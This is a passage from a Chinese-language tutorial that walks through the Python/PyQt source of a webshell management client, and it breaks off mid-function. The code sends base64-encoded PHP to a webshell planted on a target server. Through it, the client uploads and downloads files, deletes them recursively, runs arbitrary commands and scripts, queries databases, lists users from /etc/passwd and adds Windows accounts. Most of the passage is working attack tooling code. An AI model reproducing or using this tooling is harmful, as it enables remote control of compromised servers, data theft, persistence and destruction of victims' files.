            #print(filedata)
            z2 = base64.b64encode(filedata)  # 文件数据加密
            #print(z0)
            #print(z1)
            #print(z2)
            data = {shell[1]:z,"z0":z0,"z2":z2}
            #print(data)
            result =self.sendPOST(shell,data)
            #print(result)
            result = result.decode('utf-8',"ignore")
            #print(type(result))
            #print(result)#
            if int(result)==fsize:
                self.displayfile()  #刷新显示
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "上传成功!\n上传路径: "+path)
            else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "上传失败!")
        except:
            box = QtWidgets.QMessageBox()
            box.warning(self, "提示", "出现错误，上传失败！")
    else:
        box = QtWidgets.QMessageBox()
        # self.statusBar().showMessage(shell )  # 状态栏显示信息
        box.information(self, "提示", "请先连接shell！")
```

首先利用fileopen()函数调用文件打开对话框来获取需要上传的文件名，打开文件并读取数据，双层base64加密通过http请求来上传文件并刷新显示。

文件打开对话框函数如下

```python
def fileopen(self):
    fileName, selectedFilter = QFileDialog.getOpenFileName(self,(r"上传文件"),(r"C:\windows"),r"All files(*.*);;Text Files (*.txt);;PHP Files (*.php);;ASP Files (*.asp);;JSP Files (*.jsp);;ASPX Files (*.aspx)")

    return (fileName)  #返回文件路径
```

#### 5.下载文件

下载文件亦是如此，需要获取当前的本地路径然后用php代码打开靶机的文件发送过来，然后打开保存文件对话框，写入文件。

当点击下载时，调用主函数：

```python
#下载文件
def File_download(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":  #判断是否连接shell
        try:
            path =self.showfilepath("treeWidget")  #获取文件的路径
            filepath = self.Ui.treeWidget_2.currentItem().text(0)  #获取文件名
            if '.' not in filepath:
                box = QtWidgets.QMessageBox()
                # self.statusBar().showMessage(shell )  # 状态栏显示信息
                box.information(self, "提示", "文件夹不能下载！")
            else:
                compath = path+"/"+filepath  #组合路径
                phpcode = '$F = "' + compath + '";$fp=@fopen($F,"rb") or die("Unable to open file!") ;echo @fread($fp,filesize($F));@fclose($fp);die();'
                #print(filepath)
                #print(compath)
                #print(phpcode)
                returndata = self.sendcode(phpcode)  #尝试下载文件
                #print(returndata)
                #写入文件
                #print(returndata)
                if returndata != "" and returndata != "Unable to open file!":
                    savefilepath = self.filesave(filepath)
                    #print(filepath)
                    #print(savefilepath)
                    f = open(savefilepath, "wb")  # 打开文件
                    f.write(returndata)  # 写入文件
                    f.close()  # 关闭文件
                    box = QtWidgets.QMessageBox()
                    # self.statusBar().showMessage(shell )  # 状态栏显示信息
                    box.information(self, "提示", "下载成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    # self.statusBar().showMessage(shell )  # 状态栏显示信息
                    box.information(self, "提示", "下载失败！")
        except:
            box = QtWidgets.QMessageBox()
            # self.statusBar().showMessage(shell )  # 状态栏显示信息
            box.information(self, "提示", "下载失败！")
    else:
        box = QtWidgets.QMessageBox()
        # self.statusBar().showMessage(shell )  # 状态栏显示信息
        box.information(self, "提示", "请先连接shell！")
```

这里的sendcode函数便是base64加密函数。发送POST请求，得到返回的数据，并打开保存文件对话框，获取保存文件路径，最后写入到文件中。

文件保存对话框

```python
def filesave(self,filename):
    fileName, filetype= QFileDialog.getSaveFileName(self, (r"保存文件"), (r'C:\Users\Administrator\\'+ filename), r"All files(*.*)")
    #print(fileName)
    return fileName
```

#### 6.删除文件

文件删除就比较简单了，直接获取文件完整路径，发送一个cmd命令，同时删除掉treeweight中的节点就ok了。代码如下：

```python
def File_delete(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell !="":
        try:
            path = self.showfilepath("treeWidget")  # 获取文件的路径
            filepath = self.Ui.treeWidget_2.currentItem().text(0)  # 获取文件名
            compath = path + "/" + filepath  # 组合路径
            #print(compath)
            hitgroup= self.Ui.treeWidget_2.currentIndex().row()
            #删除文件
            shell = shell.split("          ")
            system = self.systemtype()
            #print(system)
            if system == "WINNT":
                compath = compath.replace('/', '\\')  # 将/替换为\ windwos下不能使用/
                if compath[-1] =='.' or compath[-2] =='.' or compath[-3] =='.' or compath[-4] =='.' :
                    phpcode = "system('" + "del /S /Q " + compath + "&&echo ok');"
                else:
                    phpcode = "system('" + "rd /S /Q " + compath + "&&echo ok');"
                returnresult=self.sendcode(phpcode).decode('utf-8',"ignore").strip()  #删除空格及换行符
                if "ok" in returnresult:
                    returnresult="ok"
            if system == "Linux":
                #phpcode = "system('whoami');"  #
                phpcode="system('rm -rf "+compath+"&&echo ok');"#
                #print(phpcode)
                returnresult = self.sendcode(phpcode).decode('utf-8',"ignore").strip() #删除空格及换行符
            if returnresult =="ok":             
                self.Ui.treeWidget_2.takeTopLevelItem(hitgroup)  #删除节点
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "删除成功！")
            else:
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "您没有权限！")
        except:
            pass
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

#### 7.重命名

重命名是打开以恶子窗口，填写修改后的名称，然后赋值给主窗口。并发送请求来修改名称，最后关闭子窗口。

重命名对话框

```python
def renameshow(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        index = self.Ui.treeWidget_2.currentItem()  # 获取子窗口的对象
        if index != None:
            self.rename = Ui_renameForm()
            self.dialog = QtWidgets.QDialog(self)
            self.rename.setupUi(self.dialog)
            self.dialog.show()
            self.rename.renameButton.clicked.connect(self.File_rename)
        else:
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请选择要重命名的项！")
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

子窗口点击确定按钮，调用以下函数：

```python
def File_rename(self):
    #hitgroup = self.Ui.treeWidget_2.currentIndex().row()#获取要修改的行号
    renamefile = self.rename.renameedit.text() #获取要修改的文件名
    #print(renamefile)
    parentpath= self.showfilepath("treeWidget")  #获取路径
    #print(parentpath)
    index = self.Ui.treeWidget_2.currentItem()  # 获取子窗口的对象
    filename = index.text(0)  # 获取文件名
    system = self.systemtype()
    if system == "WINNT":
        path = parentpath + filename  # 组合路径
        phpcode = 'system("rename ' + path + ' ' + renamefile + '");echo(ok);'  # 重命名
    if system == "Linux":
        phpcode = 'system("cd '+parentpath+'&&mv '+filename+' '+renamefile+'");echo(ok);'  # 重命名
    #print(phpcode)
    returndata=  self.sendcode(phpcode)  #发送数据
    returndata = returndata.decode('utf-8',"ignore")
    if returndata == "ok":
        self.dialog.close()  # 关闭子窗口
        self.displayfile()    #刷新显示
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "重命名", "重命名失败！")
```

当点击确定以后，调用这个函数，获取新文件名，文件的完整路径，然后通过发送cmd命令来重命名，并刷新显示。

### 三．虚拟终端

当连接成功时，会调用Virtualshell函数来获取当前的web路径，并显示在控件中。

```python
def Virtualshell(self):
    #self.Ui.textEdit.setReadOnly(True)  #设置textRdit不可编辑
    system = self.systemtype()  #判断系统类型
    if system == "WINNT":
        phpcode = "system('chdir');"
    if system == "Linux":
        phpcode = "system('pwd');"
    data = self.sendcode(phpcode)
    data = data.decode('gbk', "ignore")  # 解码utf8，忽略其中有异常的编码，仅显示有效的编码
    #print(data)
    self.Ui.textEdit.clear()
    self.Ui.textEdit.append(data.strip().strip('\r\n').strip('\n').strip('\r')+'>')
```

#### 1.虚拟终端右键菜单

当点击右键时，执行以下代码来创建右键菜单

```python
self.Ui.history.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
self.Ui.history.customContextMenuRequested['QPoint'].connect(self.createtextEditMenu)
```

虚拟终端右键菜单代码如下：

```python
def createtextEditMenu(self):
    '''''
        创建右键菜单
        '''
    # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
    # 否则无法使用customContextMenuRequested信号
    self.Ui.textEdit.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
    self.Ui.textEdit.customContextMenuRequested.connect(self.showContextMenu)

    # 创建QMenu
    self.contextMenu = QtWidgets.QMenu(self)
    self.copy_textEdit = self.contextMenu.addAction(u'复制')
    self.paste_textEdit = self.contextMenu.addAction(u'粘贴')
    self.clear_textEdit = self.contextMenu.addAction(u'清空')

    # 将动作与处理函数相关联
    # 这里为了简单，将所有action与同一个处理函数相关联，
    # 当然也可以将他们分别与不同函数关联，实现不同的功能
    self.copy_textEdit.triggered.connect(self.Copy_textEdit)
    self.paste_textEdit.triggered.connect(self.Paste_textEdit)
    self.clear_textEdit.triggered.connect(self.Clear_textEdit)

```



#### 2.历史命令右键菜单

当点击右键时，执行以下代码来创建右键菜单

```python
self.Ui.history.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
self.Ui.history.customContextMenuRequested['QPoint'].connect(self.createhistoryMenu)
```

历史命令右键菜单代码如下：

```python
def createhistoryMenu(self):
    '''''
        创建右键菜单
        '''
    # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
    # 否则无法使用customContextMenuRequested信号
    self.Ui.history.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
    self.Ui.history.customContextMenuRequested.connect(self.showContextMenu)

    # 创建QMenu
    self.contextMenu = QtWidgets.QMenu(self)
    self.copy_history = self.contextMenu.addAction(u'复制')
    self.daochu_history = self.contextMenu.addAction(u'导出')
    self.delete_history = self.contextMenu.addAction(u'删除')
    self.clear_history = self.contextMenu.addAction(u'清空')

    # 将动作与处理函数相关联
    # 这里为了简单，将所有action与同一个处理函数相关联，
    # 当然也可以将他们分别与不同函数关联，实现不同的功能
    self.copy_history.triggered.connect(self.Copy_history)
    self.daochu_history.triggered.connect(self.Daochu_history)
    self.delete_history.triggered.connect(self.Delete_history)
    self.clear_history.triggered.connect(self.Clear_history)
```

#### 3.虚拟终端功能

##### （1）复制

```python
#复制
def Copy_textEdit(self):
    data = self.Ui.textEdit.textCursor().selectedText()
    # 访问剪切板，存入值
    wincld.OpenClipboard()
    wincld.EmptyClipboard()
    wincld.SetClipboardData(win32con.CF_UNICODETEXT, data)
    wincld.CloseClipboard()
```

直接获取当前选中的文件，存储到系统的剪切板中。

##### （2）粘贴

```python
#粘贴
def Paste_textEdit(self):
    wincld.OpenClipboard()
    text = wincld.GetClipboardData(win32con.CF_UNICODETEXT)
    wincld.CloseClipboard()
    self.Ui.textEdit.insertPlainText(text)  #插入文本不换行
```
读取剪切板中的内容。添加到当前光标之后。

##### （3）清空

```python
#清空
def Clear_textEdit(self):
    self.Ui.textEdit.clear()
    self.Virtualshell()
```

清空当控件内的所有文字

##### （4）Enter

当用户输入完成命令，按下Enter时调用函数。这里时重载了Enter按键。

```python
def eventFilter(self,watched, event):
    if watched == self.Ui.textEdit:
        if event.type() == QEvent.KeyPress and (event.key() == Qt.Key_Enter or event.key() == Qt.Key_Return):
            shell = self.Ui.shelllabel.text()  # 获取shell

            if shell != "":
                shellcode = self.Ui.textEdit.toPlainText()  # 获取内容
                shellcode2 = shellcode.split('>')
                path = str(shellcode2[-2]).split('\n')[-1]  # 取出路径
                #快捷键clear 清空文档
                #print(shellcode2)
                if shellcode2[-1] == 'clear' or shellcode2[-1] == 'Clear':
                    self.Ui.textEdit.clear()
                    self.Ui.textEdit.append(path.strip().strip('\r\n').strip('\n').strip('\r')+'>')

                    #self.Ui.textEdit.moveCursor(QtGui.QTextCursor.End,QTextCursor.MoveAnchor)  # 光标移动到最后
                    if shellcode2[-1] != '' and shellcode2[-1] != '\n':
                        # print(shellcode2[-1])
                        self.Ui.history.addItem(shellcode2[-1])  # 为history添加历史命令
                else:
                    self.Virtualshellgo()
            else:
                pass
            return False
        else:
            return False
```

当按下Enter按键时，获取用户输入的命令，这里设置了clear文本为清空。如不是clear，调用Virtualshellgo()函数

Virtualshellgo()函数

```python
def Virtualshellgo(self):
    # 获取框里的输入文本
    shellcode = self.Ui.textEdit.toPlainText()  # 获取内容
    shellcode2 = shellcode.split('>')
    path = str(shellcode2[-2]).split('\n')[-1]  # 取出路径
    # print(shellcode2[1])
    # print(path)
    # print(shellcode2[-1])  #历史命令
    if path == '':
        path = shellcode2[1]
    # print(path)
    # 判断是否有输入
    if shellcode2[-1] != '':
        # print(shellcode2[-1])
        # print(shellcode2[-2])
        # print(shellcode2[-2][3:])
        system = self.systemtype()  #得到系统类型
        if system == "WINNT":
            cmd = "chdir"
            phpcode = "system('cd /d " + path + '&' + shellcode2[-1] + "&" + cmd + "');"
        if system == "Linux":
            cmd = "pwd"
            phpcode = "system('cd " + path + '&&' + shellcode2[-1] + "&&" + cmd + "');"
        # print(path)
        panlist= self.getpan()  #得到所有盘符
        if shellcode2[-1] in panlist:
            self.Ui.textEdit.append(shellcode2[-1] + '\>')
        if shellcode2[-1] == 'cd ..':  # 判断输入的命令是不是cd ..
            if cmd =='chdir':
                fuhao = "\\"
            if cmd =='pwd':
                fuhao='/'
            path2 = path.split(fuhao)
            path2 = path2[0:-1]
            path = fuhao.join(path2)
            self.Ui.textEdit.append(path + '>')
            if shellcode2[-1] != '' and shellcode2[-1] != '\n':
                # print(shellcode2[-1])
                self.Ui.history.addItem(shellcode2[-1])  # 为history添加历史命令
            # print(path)

        #print(panlist)
        else:
            # print(path)
            #print(phpcode)
            returncommand = self.sendcode(phpcode)
            if returncommand != None:
                returncommand = returncommand.decode('gbk', "ignore")  # 解码utf8，忽略其中有异常的编码，仅显示有效的编码
                # print(returncommand)
                data = returncommand.strip().strip('\r\n').strip('\n').strip('\r')  # 需要设置的数据
                # print(data)
                self.Ui.textEdit.append(data +'>')
                # self.Ui.textEdit.moveCursor(QTextCursor.Start)
                # self.Ui.textEdit.moveCursor(QtGui.QTextCursor.End,QTextCursor.MoveAnchor)  # 光标移动到最后
                if shellcode2[-1] != '' and shellcode2[-1] != '\n':
                    # print(shellcode2[-1])
                    self.Ui.history.addItem(shellcode2[-1])  # 为history添加历史命令
            else:
                pass
    else:
        self.Ui.textEdit.append(path.strip().strip('\r\n').strip('\n').strip('\r') + '>')
        # self.Ui.textEdit.moveCursor(QtGui.QTextCursor.End)  # 光标移动到最后
```

这块代码比较长，首先判断命令里有没有cd，若有，直接将路径减去或加上。若没有，便发送请求来执行命令，并将命令写入到历史命令窗口中。将光标移动到最后。

#### 4.历史命令功能

##### （1）复制

```python
#复制
def Copy_history(self):
    data = self.Ui.history.currentItem().text()  #获取当前选中的数据
    #print(data)
    #访问剪切板，存入值
    wincld.OpenClipboard()
    wincld.EmptyClipboard()
    wincld.SetClipboardData(win32con.CF_UNICODETEXT, data)
    wincld.CloseClipboard()
```

直接获取当前选中的文件，存储到系统的剪切板中。

##### （2）导出

```python
#导出
def Daochu_history(self):
    filepath = self.filesave('历史命令.txt')
    #print(filename)
    num = self.Ui.history.count()  # 获取listweight行数
    # print(num)
    try:
        f = open(filepath, "w", encoding='utf-8')  # 打开文件
        for i in range(1, num):
            data = self.Ui.history.item(i).text()  # 获取i行的数据
            # print(data)
            f.write(data + "\n")  # 写入文件
        f.close()  # 关闭文件
    except:
        pass
```

遍历所有数据，将数据写入到文件中.

##### （3）删除

```python
#删除
def Delete_history(self):
    shell = self.Ui.history.currentRow()  # 获取选择项的行号
    self.Ui.history.takeItem(shell)
    # 获取当前选中的行号
```

删除当前选中的节点。

##### （4）清空

```python
#清空
def Clear_history(self):
    self.Ui.history.clear()
    self.Ui.history.addItem('历史命令')
```

清空当前控件内的所有文字

### 四．自写脚本

​    自写脚本页框内含有多种脚本选项，用户可以自行选择自己想要执行的脚本类型，然后进行执行，也可以从本地载入脚本，还含有保存功能，防止脚本丢失，并有一个执行按钮，当用户点击执行按钮的时候，程序会读取用户输入，并发送给远程服务器，新建脚本来执行脚本。

#### 1.载入

载入按钮调用的函数

```python
##载入脚本
def ZairuJiaoben(self):
    try:
        filename = self.fileopen()   #文件打开对话框，并获取文件路径
        f = open(filename, "r")   #打开文件
        filedata = f.read()    #读取数据
        f.close()   #关闭文件
        self.Ui.textEdit_3.clear()  #清空文本
        self.Ui.textEdit_3.setText(filedata)   #设置文本
    except:
        pass
```

当点击载入按钮后，调用此函数，尝试调用文件打开对话框，返回文件的路径，然后打开文件读取数据，将数据显示在textEdit_3中。

#### 2.保存

保存按钮调用的函数

```python
def SaveJiaoben(self):
    data  = self.Ui.textEdit_3.toPlainText()  #获取textEdit_3的内容
    if data != "":
        try:
            path = self.filesave("jiaoben.txt")
            f= open(path,"w",encoding='utf-8')
            f.write(data)
            f.close()
        except:
            pass
    else:
        box = QtWidgets.QMessageBox()
        box.warning (self, "警告", "您未输入任何字符！")
```

当点击保存按钮后，调用此函数，获取输入的内容，尝试调用文件保存对话框，返回文件的路径，然后打开文件写入数据，关闭文件。

#### 3.清空

清空按钮调用的函数

```python
#脚本清空按钮
def ClearJiaoben(self):
    self.Ui.textEdit_3.clear()
```

这行代码非常简单，就是清空textEdit_3中的所有内容。

#### 4.执行

执行按钮调用的函数

```python
#执行脚本
def ZhixingJiaoben(self):
    scriptdata = self.Ui.textEdit_3.toPlainText()  #获取输入的脚本内容
    type = self.Scripttype()   #判断选择的脚本类型
    shell = self.Ui.shelllabel.text()  # 获取shell
    shell = shell.split("     ")
    system = self.systemtype()  # 获取系统类型
    if shell[2]=="PHP":
        try:
            if type == "PHP":
                data = self.sendcode(scriptdata)   #发送数据，返回结果
                data = data.decode('utf-8', "ignore")
                data = self.zhixingcuowu(data) #判断是否错误
                self.Ui.jiaobenjieguo.setText(data)  #设置结果
            if type == "ASP":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "PHP语言不能执行ASP脚本！")
            if type == "JSP":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "PHP语言不能执行JSP脚本！")
            if type == "BASH" and system == "Linux":
                #phpcode = "system('cd /tmp&&touch 1.sh&&" + scriptdata + ">>1.sh&&/bin/bash 1.sh');"
                phpcode='fwrite(fopen("/tmp/1.sh","w"),"'+scriptdata+'");die();system("/bin/bash 1.sh");'
                data = self.sendcode(phpcode)
                data = data.decode('utf-8', "ignore")
                data = self.zhixingcuowu(data) #判断是否错误
                self.Ui.jiaobenjieguo.setText(data)  # 设置结果
            if type == "Bat" and system == "WINNT":
                phpcode = 'fwrite(fopen("C:\\Users\Public\\\\1.bat","w"),"'+scriptdata+'");die();system("C:\\Users\Public\\\\1.bat");'
                # print(phpcode)
                data = self.sendcode(phpcode)
                data = data.decode('utf-8', "ignore")
                data = self.zhixingcuowu(data) #判断是否错误
                self.Ui.jiaobenjieguo.setText(data)  # 设置结果
            if type == "Python":
                if system == "WINNT":
                    phpcode = 'fwrite(fopen("C:\\Users\Public\\\\1.py","w"),"' + scriptdata + '");die();system("python3 C:\\Users\Public\\\\1.py");'
                if system == "Linux":
                    phpcode = 'fwrite(fopen("/tmp/1.py","w"),"' + scriptdata + '");die();system("python3 1.py");'
                # print(phpcode)
                data = self.sendcode(phpcode)
                data = data.decode('utf-8', "ignore")
                data = self.zhixingcuowu(data) #判断是否错误
                self.Ui.jiaobenjieguo.setText(data)  # 设置结果
            if type == "BASH" and system == "WINNT":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "Windows系统不支持bash脚本！")
            if type == "Bat" and system == "Linux":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "Linux系统不支持shell脚本！")
        except:
            box = QtWidgets.QMessageBox()
            box.warning(self, "警告", "类型选择错误！")

    if shell[2] == "ASP":
        try:
            if type == "PHP":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "ASP语言不能执行PHP脚本！")
            if type == "ASP":
                    pass
            if type == "JSP":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "ASP语言不能执行JSP脚本！")
            if type == "BASH" and system == "Linux":
                pass
            if type == "Bat" and system == "WINNT":
                pass
            if type == "Python":
                pass
            if type == "Bash" and system == "WINNT":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "Windows系统不支持bash脚本！")
            if type == "Bat" and system == "Linux":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "Linux系统不支持Bat脚本！")
        except:
            box = QtWidgets.QMessageBox()
            box.warning(self, "警告", "类型选择错误！")

    if shell[2] == "JSP":
        try:
            if type == "PHP":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "JSP语言不能执行PHP脚本！")
            if type == "ASP":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "JSP语言不能执行ASP脚本！")
            if type == "JSP":
                pass
            if type == "BASH" and system == "Linux":
                pass
            if type == "Bat" and system == "WINNT":
                pass
            if type == "Python":
                pass
            if type == "BASH" and system == "WINNT":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "Windows系统不支持bash脚本！")
            if type == "Bat" and system == "Linux":
                box = QtWidgets.QMessageBox()
                box.warning(self, "提示", "Linux系统不支持Bat脚本！")
            else:
                box = QtWidgets.QMessageBox()
                box.warning(self, "警告", "类型选择错误！")
        except:
            box = QtWidgets.QMessageBox()
            box.warning(self, "警告", "类型选择错误！")
```

这块代码比较长，首先获取用户输入的脚本，然后调用了Svripttype()函数来判断用户选择的脚本类型，然后调用systemtype()函数来判断系统类型，不同的系统执行不同的代码，最后，通过POST请求来发送数据来执行脚本。

判断脚本错误函数

```python
def zhixingcuowu(self,data):
    if 'Parse error' in data:
        return '脚本执行错误！'
    else:
        return '脚本执行完成！\n'+data
```

Scripttype()函数

```python
def Scripttype(self):
    if self.Ui.PHP.isChecked() == True:
        return 'PHP'
    if self.Ui.BASH.isChecked() == True:
        return 'BASH'
    if self.Ui.Python.isChecked() == True:
        return 'Python'
    if self.Ui.ASP.isChecked() == True:
        return 'ASP'
    if self.Ui.JSP.isChecked() == True:
        return 'JSP'
    if self.Ui.Bat.isChecked() == True:
        return 'Bat'
```

### 五．数据库管理

数据管理为扩展项目，在这个页面上，用户需提前配置好sql账号、密码、地址、及数据库名称。然后便可以在单行输入框输入想要执行的sql语句。点击执行即可在下方显示执行的结果，目前仅支持mysql数据库。

#### 1.配置

当用户点击配置按钮时，调用以下函数：

```python
#sql配置子窗口显示
def Sql_peizhi_show(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        self.sqlpeizhi = Ui_sql_peizhi()
        self.dialog = QtWidgets.QDialog(self)
        self.sqlpeizhi.setupUi(self.dialog)
        self.dialog.show()
        self.sqlpeizhi.sql_peizhi_ok.clicked.connect(self.Sql_peizhi_ok_pushbutton)
        #读取数据库信息
        with open('database.csv') as f:
            reader = csv.reader(f)
            peizhi = [row[1] for row in reader]
        #设置数据库子窗口默认值
        self.sqlpeizhi.sql_name_edit.setText(peizhi[0])
        self.sqlpeizhi.sql_passwd_edit.setText(peizhi[1])
        self.sqlpeizhi.sql_database_edit.setText(peizhi[2])
        #设置子窗口数据库类型默认值
        if peizhi[3]=="MYSQL":
            self.sqlpeizhi.sql_type.setCurrentIndex(0);
        if peizhi[3]=="MSSQL":
            self.sqlpeizhi.sql_type.setCurrentIndex(1);
        if peizhi[3]=="ORACLE":
            self.sqlpeizhi.sql_type.setCurrentIndex(2);
        if peizhi[3]=="ACCESS":
            self.sqlpeizhi.sql_type.setCurrentIndex(3);
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

首先，调用sql配置子窗口显示，用户在这里输入必需的数据，这里会读取上一次用户保存的账户名密码等信息，显示在子窗口上。

当用户点击确定时，触发以下函数：

```python
##sql配置确定按钮
def Sql_peizhi_ok_pushbutton(self):
    username = self.sqlpeizhi.sql_name_edit.text()  # 获取sql配置对话框用户名
    passwd = self.sqlpeizhi.sql_passwd_edit.text()  # 获取sql配置对话框密码
    database = self.sqlpeizhi.sql_database_edit.text()  # 获取sql配置对话框数据库名
    sqltype = self.sqlpeizhi.sql_type.currentText()  # 获取数据库类型
    # print(sqltype)
    self.dialog.close()
    datas = [['username', username],
             ['passwd', passwd],
             ['database', database],
             ['sqltype', sqltype],]
    # print(datas)
    #写入到csv文件
    with open('database.csv', 'w', newline='') as f:
        writer = csv.writer(f)
        for row in datas:
            writer.writerow(row)
    f.close()
```

在这个函数中，首先获取用户输入的用户名、密码、数据库名、类型，然后打开或创建一个CSV文件，将数据保存到CSV文件中。

#### 2.执行

当用户点击执按钮：

```python
##sql语句执行
def Sql_ok(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        sql = self.Ui.sql_yuju.text()  #获取sql语句
        if sql!="":
            #使用数据库
            if sql[0:3] == "use":
                sql = sql.split(" ")
                # peizhi[3] =
                content=[]
                #将数据库信息更新
                with open('database.csv','r') as csvfile:
                    rows = csv.reader(csvfile)
                    for line in rows:
                        content.append(line)
                    content[2][-1]=sql[1][0:-1]
                csvfile.close
                # print(content)
                with open('database.csv','w',newline='') as f:
                    # 写入到csv文件
                    writer = csv.writer(f)
                    for row in content:
                        writer.writerow(row)
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "当前数据库设置为"+content[2][-1]+"！")

            else:
                #读取数据库配置
                with open('database.csv') as f:
                    reader = csv.reader(f)
                    peizhi = [row[1] for row in reader]
                # print(peizhi)
                if peizhi[-1]=="MYSQL":
                    phpcode ='$link=new mysqli("127.0.0.1","'+peizhi[0]+'","'+peizhi[1]+'","'+peizhi[2]+'");if(mysqli_connect_error()){echo "连接失败";exit();}$sql="'+sql+'";$res=$link->query($sql);$data=$res->fetch_all();var_dump($data);'
                    # print(phpcode)
                    data = self.sendcode(phpcode)
                    data = data.decode('utf-8', "ignore")
                    #正则表达式取出双引号之间的数据
                    pattern = re.compile('"(.*)"')
                    data = pattern.findall(data)
                    print(data)
                    if "连接失败" in str(data):
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "连接失败！")
                    else:
                        self.Ui.sql_textEdit.clear()
                        for i in data:
                            self.Ui.sql_textEdit.append(i)
                if peizhi[-1]=="MSSQL":
                    pass
                if peizhi[-1]=="ORACLE":
                    pass
                if peizhi[-1]=="ACCESS":
                    pass
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

首先，然后shell是否已连接，未连接即弹出‘请先连接shell’，已连接，判断sql语句是否已经输入，若已输入则判断是否含有use，若时use则将csv文件中的数据库名更新。否则将拼接成php代码，发送到服务端执行。将结果返回在客户端。

### 六．快捷功能

​        快捷功能这里包含多种功能，如查询用户、添加用户、修改密码、强制关机、开启3389、中文检测等等，方便用户使用。

#### 1.查询用户

查询用户点击调用的函数

```python
def User(self,num=1):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell == "":
        box = QtWidgets.QMessageBox()
        box.warning(self, "提示", "请先连接shell！")
    else:
        system = self.systemtype()  # 获取系统类型
        user = ""
        if system == "WINNT":

            phpcode = 'system("net user");'
            #print(phpcode)
            data = self.sendcode(phpcode)
            #print(data)
            #print(data[113:-20])
            if data !=None:
                data = data.decode('gbk', "ignore")
                #print(data)
                data =data.split('-------------------------------------------------------------------------------')
                #print(data[1])
                data=data[1].replace('\r\n', '').split(" ")
                #print(data)
                # #print(data)
        if system == "Linux":
            phpcode = 'system("cat /etc/passwd |cut -f 1 -d :");'  # 组合命令
            data = self.sendcode(phpcode).decode('utf-8')
            data=data.split("\n")
        if num ==2 :
            userlist= []
            for i in data[:-1]:
                if i !="":
                    userlist.append(i[:-1])
            return userlist
        else:
            for i in data[:-1]:
                if i !="":
                    user += "用户："+i+"\n"
            #print(user)
            box = QtWidgets.QMessageBox()
            box.about (self, "查询用户", user[:-1])
```

首先判断shell连接，已连接则获取系统类型，然后执行cmd命令来获取当前所有用户，将结果处理后，弹框显示给用户。这里的num=2是修改密码调用此函数的值。

#### 2.添加用户

添加用户点击调用的函数

```python
def useraddshow(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        self.adduser = Ui_adduserForm()
        self.dialog = QtWidgets.QDialog(self)
        self.adduser.setupUi(self.dialog)
        self.dialog.show()
        self.adduser.userButton.clicked.connect(self.Adduser)
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

首先判断shell连接，已连接则调用添加用户子窗口显示。

当子窗口点击确定时，调用以下函数：

```python
#添加用户按钮
def Adduser(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    username = self.adduser.userEdit.text()  #获取添加用户对话框用户名
    #print(username)
    password = self.adduser.passwordEdit.text() #获取添加用户对话框密码
    system = self.systemtype()  # 获取系统类型
    if system == "WINNT":
        phpcode = 'system("net user '+username+" "+password+" "+'/add");' #组合命令
        returndata  = self.sendcode(phpcode)    #发送命令
        if returndata !="":
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "添加成功！")
        else:
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "添加失败！")
    if system == "Linux":
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "暂不支持Linux！")
```

在这个函数中，首先获取用户名，密码，然后判断系统类型，执行命令来添加用户。

#### 3.修改密码

修改密码点击调用的函数

```python
def changepasswdshow(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        self.changepasswd = Ui_changepassword()
        self.dialog = QtWidgets.QDialog(self)
        self.changepasswd.setupUi(self.dialog)
        user = self.User(num=2) #返回用户列表
        for i in user:
            self.changepasswd.listWidget.addItem(i) #添加用户到子窗口
        self.dialog.show()
        self.changepasswd.changeuserButton.clicked.connect(self.Changepasswd)
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

同样是调用了一个子窗口显示。将用户列表显示在子窗口上，并提示用户输入密码。

当子窗口点击确定时，调用以下函数：

```python
#修改密码按钮调用的函数
def Changepasswd(self):
    username = self.changepasswd.listWidget.currentItem().text()   #获取修改密码窗口的用户名
    passwd = self.changepasswd.changepasswordEdit.text() #获取修改密码窗口的密码
    #print(username)
    #print(passwd)
    if passwd !='':
        system = self.systemtype()  # 获取系统类型
        if system == "WINNT":
